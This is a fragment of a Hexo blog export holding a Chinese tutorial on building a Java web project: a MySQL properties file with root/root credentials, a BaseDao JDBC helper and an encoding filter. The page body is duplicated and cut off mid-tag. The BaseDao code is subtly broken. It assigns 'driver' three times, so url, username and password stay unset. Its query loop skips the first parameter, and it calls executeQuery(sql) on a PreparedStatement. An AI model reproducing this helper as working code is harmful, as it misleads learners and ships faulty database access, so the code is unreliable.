}\n}\n```\n\n","slug":"javaWeb项目搭建subms","published":1,"updated":"2022-01-17T10:15:51.835Z","_id":"ckyiip9mg0010gsw97svsbyek","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"项目搭建–javaWeb\"><a href=\"#项目搭建–javaWeb\" class=\"headerlink\" title=\"项目搭建–javaWeb\"></a>项目搭建–javaWeb</h1><h4 id=\"1-配置一个maven-webapp项目\"><a href=\"#1-配置一个maven-webapp项目\" class=\"headerlink\" title=\"1.配置一个maven webapp项目\"></a>1.配置一个maven webapp项目</h4><h4 id=\"2-配置tomcat\"><a href=\"#2-配置tomcat\" class=\"headerlink\" title=\"2.配置tomcat\"></a>2.配置tomcat</h4><h4 id=\"3-测试项目是否能够跑起来\"><a href=\"#3-测试项目是否能够跑起来\" class=\"headerlink\" title=\"3.测试项目是否能够跑起来\"></a>3.测试项目是否能够跑起来</h4><h4 id=\"4-导入项目中可能会遇到的jar包\"><a href=\"#4-导入项目中可能会遇到的jar包\" class=\"headerlink\" title=\"4.导入项目中可能会遇到的jar包\"></a>4.导入项目中可能会遇到的jar包</h4><p>servlet,jsp,mysql-connector,standard….,记得maven同步一下</p>\n<h4 id=\"5-创建项目包结构\"><a href=\"#5-创建项目包结构\" class=\"headerlink\" title=\"5.创建项目包结构\"></a>5.创建项目包结构</h4><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117181550313.png\" alt=\"image-20220117181550313\"></p>\n<h4 id=\"6-编写实体类\"><a href=\"#6-编写实体类\" class=\"headerlink\" title=\"6.编写实体类\"></a>6.编写实体类</h4><p>ORM映射: 表—类映射</p>\n<h4 id=\"7-编写基础公共类\"><a href=\"#7-编写基础公共类\" class=\"headerlink\" title=\"7.编写基础公共类\"></a>7.编写基础公共类</h4><h5 id=\"数据库配置文件\"><a href=\"#数据库配置文件\" class=\"headerlink\" title=\"数据库配置文件\"></a>数据库配置文件</h5><figure class=\"highlight properties\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">driver</span>=<span class=\"string\">com.mysql.jdbc.Driver</span></span><br><span class=\"line\"><span class=\"attr\">url</span>=<span class=\"string\">jdbc:mysql://localhost:3306/subms?useUnicode&amp;characterEncoding=utf-8</span></span><br><span class=\"line\"><span class=\"attr\">username</span>=<span class=\"string\">root</span></span><br><span class=\"line\"><span class=\"attr\">password</span>=<span class=\"string\">root</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"编写数据库的公共类-BaseDao-java\"><a href=\"#编写数据库的公共类-BaseDao-java\" class=\"headerlink\" title=\"编写数据库的公共类   BaseDao.java\"></a>编写数据库的公共类   BaseDao.java</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.dao;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Properties;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BaseDao</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String driver;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String url;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String username;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//静态代码块,类加载的时候就初始化了</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        Properties properties =<span class=\"keyword\">new</span> Properties();</span><br><span class=\"line\">        <span class=\"comment\">//通过类加载器读取对应的资源</span></span><br><span class=\"line\">        InputStream is=BaseDao.class.getClassLoader().getResourceAsStream(<span class=\"string\">&quot;db.properties&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            properties.load(is);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (IOException e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        driver=properties.getProperty(<span class=\"string\">&quot;driver&quot;</span>);</span><br><span class=\"line\">        driver=properties.getProperty(<span class=\"string\">&quot;username&quot;</span>);</span><br><span class=\"line\">        driver=properties.getProperty(<span class=\"string\">&quot;password&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Connection <span class=\"title\">getConnection</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Connection connection = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Class.forName(driver);</span><br><span class=\"line\">            connection= DriverManager.getConnection(url,username,password);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> connection;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> ResultSet <span class=\"title\">execute</span><span class=\"params\">(Connection connection,String sql,Object[] params,ResultSet resultSet)</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">        PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;params.length;i++)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//setObject方法不能从1开始,但是数组是从0开始</span></span><br><span class=\"line\">            preparedStatement.setObject(i+<span class=\"number\">1</span>,params[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        resultSet = preparedStatement.executeQuery(sql);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> resultSet;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">execute</span><span class=\"params\">(Connection connection,String sql,Object[] params,PreparedStatement preparedStatement)</span> <span class=\"keyword\">throws</span> SQLException</span>&#123;</span><br><span class=\"line\">        preparedStatement=connection.prepareStatement(sql);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;params.length;i++)&#123;</span><br><span class=\"line\">            preparedStatement.setObject(i+<span class=\"number\">1</span>,params[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> updateRows=preparedStatement.executeUpdate();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> updateRows;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//释放资源</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">closeResource</span><span class=\"params\">(Connection connection,PreparedStatement preparedStatement,ResultSet resultSet)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> flag=<span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(resultSet!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                resultSet.close();</span><br><span class=\"line\">                resultSet=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (SQLException e)&#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                flag=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preparedStatement!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                preparedStatement.close();</span><br><span class=\"line\">                preparedStatement=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (SQLException e)&#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                flag=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(connection!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                connection.close();</span><br><span class=\"line\">                connection=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (SQLException e)&#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                flag=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"配置字符编码过滤器\"><a href=\"#配置字符编码过滤器\" class=\"headerlink\" title=\"配置字符编码过滤器\"></a>配置字符编码过滤器</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-class</span>&gt;</span>com.blue.filter.CharactorEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-class</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-mapping</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--过滤所有请求--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.filter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CharactorEncodingFilter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"comment\">//filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">        servletRequest.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        servletResponse.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        servletResponse.setContentType(<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class=\"line\">        filterChain.doFilter(servletRequest, servletResponse);<span class=\"comment\">//让请求继续走,不写程序就会在这里停止</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"项目搭建–javaWeb\"><a href=\"#项目搭建–javaWeb\" class=\"headerlink\" title=\"项目搭建–javaWeb\"></a>项目搭建–javaWeb</h1><h4 id=\"1-配置一个maven-webapp项目\"><a href=\"#1-配置一个maven-webapp项目\" class=\"headerlink\" title=\"1.配置一个maven webapp项目\"></a>1.配置一个maven webapp项目</h4><h4 id=\"2-配置tomcat\"><a href=\"#2-配置tomcat\" class=\"headerlink\" title=\"2.配置tomcat\"></a>2.配置tomcat</h4><h4 id=\"3-测试项目是否能够跑起来\"><a href=\"#3-测试项目是否能够跑起来\" class=\"headerlink\" title=\"3.测试项目是否能够跑起来\"></a>3.测试项目是否能够跑起来</h4><h4 id=\"4-导入项目中可能会遇到的jar包\"><a href=\"#4-导入项目中可能会遇到的jar包\" class=\"headerlink\" title=\"4.导入项目中可能会遇到的jar包\"></a>4.导入项目中可能会遇到的jar包</h4><p>servlet,jsp,mysql-connector,standard….,记得maven同步一下</p>\n<h4 id=\"5-创建项目包结构\"><a href=\"#5-创建项目包结构\" class=\"headerlink\" title=\"5.创建项目包结构\"></a>5.创建项目包结构</h4><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117181550313.png\" alt=\"image-20220117181550313\"></p>\n<h4 id=\"6-编写实体类\"><a href=\"#6-编写实体类\" class=\"headerlink\" title=\"6.编写实体类\"></a>6.编写实体类</h4><p>ORM映射: 表—类映射</p>\n<h4 id=\"7-编写基础公共类\"><a href=\"#7-编写基础公共类\" class=\"headerlink\" title=\"7.编写基础公共类\"></a>7.编写基础公共类</h4><h5 id=\"数据库配置文件\"><a href=\"#数据库配置文件\" class=\"headerlink\" title=\"数据库配置文件\"></a>数据库配置文件</h5><figure class=\"highlight properties\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">driver</span>=<span class=\"string\">com.mysql.jdbc.Driver</span></span><br><span class=\"line\"><span class=\"attr\">url</span>=<span class=\"string\">jdbc:mysql://localhost:3306/subms?useUnicode&amp;characterEncoding=utf-8</span></span><br><span class=\"line\"><span class=\"attr\">username</span>=<span class=\"string\">root</span></span><br><span class=\"line\"><span class=\"attr\">password</span>=<span class=\"string\">root</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"编写数据库的公共类-BaseDao-java\"><a href=\"#编写数据库的公共类-BaseDao-java\" class=\"headerlink\" title=\"编写数据库的公共类   BaseDao.java\"></a>编写数据库的公共类   BaseDao.java</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.dao;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Properties;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BaseDao</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String driver;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String url;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String username;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//静态代码块,类加载的时候就初始化了</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        Properties properties =<span class=\"keyword\">new</span> Properties();</span><br><span class=\"line\">        <span class=\"comment\">//通过类加载器读取对应的资源</span></span><br><span class=\"line\">        InputStream is=BaseDao.class.getClassLoader().getResourceAsStream(<span class=\"string\">&quot;db.properties&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            properties.load(is);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (IOException e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        driver=properties.getProperty(<span class=\"string\">&quot;driver&quot;</span>);</span><br><span class=\"line\">        driver=properties.getProperty(<span class=\"string\">&quot;username&quot;</span>);</span><br><span class=\"line\">        driver=properties.getProperty(<span class=\"string\">&quot;password&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Connection <span class=\"title\">getConnection</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Connection connection = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Class.forName(driver);</span><br><span class=\"line\">            connection= DriverManager.getConnection(url,username,password);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> connection;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> ResultSet <span class=\"title\">execute</span><span class=\"params\">(Connection connection,String sql,Object[] params,ResultSet resultSet)</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">        PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;params.length;i++)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//setObject方法不能从1开始,但是数组是从0开始</span></span><br><span class=\"line\">            preparedStatement.setObject(i+<span class=\"number\">1</span>,params[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        resultSet = preparedStatement.executeQuery(sql);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> resultSet;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">execute</span><span class=\"params\">(Connection connection,String sql,Object[] params,PreparedStatement preparedStatement)</span> <span class=\"keyword\">throws</span> SQLException</span>&#123;</span><br><span class=\"line\">        preparedStatement=connection.prepareStatement(sql);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;params.length;i++)&#123;</span><br><span class=\"line\">            preparedStatement.setObject(i+<span class=\"number\">1</span>,params[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> updateRows=preparedStatement.executeUpdate();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> updateRows;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//释放资源</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">closeResource</span><span class=\"params\">(Connection connection,PreparedStatement preparedStatement,ResultSet resultSet)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> flag=<span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(resultSet!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                resultSet.close();</span><br><span class=\"line\">                resultSet=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (SQLException e)&#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                flag=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preparedStatement!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                preparedStatement.close();</span><br><span class=\"line\">                preparedStatement=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (SQLException e)&#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                flag=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(connection!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                connection.close();</span><br><span class=\"line\">                connection=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (SQLException e)&#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                flag=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"配置字符编码过滤器\"><a href=\"#配置字符编码过滤器\" class=\"headerlink\" title=\"配置字符编码过滤器\"></a>配置字符编码过滤器</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-class</span>&gt;</span>com.blue.filter.CharactorEncodingFilter<span class=\"tag\">&lt;/<span 